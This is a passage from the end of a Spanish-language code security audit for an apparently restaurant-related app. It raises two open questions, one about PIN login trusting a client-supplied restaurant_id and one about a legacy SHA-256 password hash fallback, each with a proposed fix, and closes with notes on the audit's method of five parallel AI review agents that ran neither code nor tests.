9. **PIN login con `body.restaurant_id` cliente-supplied** — ¿Es porque el QR/login flow no tiene aún el restaurant_id en sesión? Si es legítimo, agregar cross-check post-lookup que el staff retornado pertenezca al restaurant_id supplied (defensa en profundidad).

10. **Auth fallback SHA-256 plain en `auth.py:53-68`** — ¿Cuántos hashes legacy quedan en producción? Si son menos de N, force-rehash en login y dropear el fallback.

---

## Anexo: Notas de método

- 5 agentes especializados corriendo en paralelo (Code Reviewer, Code Reviewer, Code Reviewer, Code Reviewer, Explore).
- Cada uno revisó ~3000 LOC con `Read` + `Grep` selectivo.
- Cifras como "LOC" son `wc -l` o conteo de bytes / 50.
- Todas las citaciones `archivo:línea` fueron verificadas por al menos un agente.
- No se ejecutó código (RLS audit empírico ya existía en CLAUDE.md).
- No se ran tests durante esta auditoría.
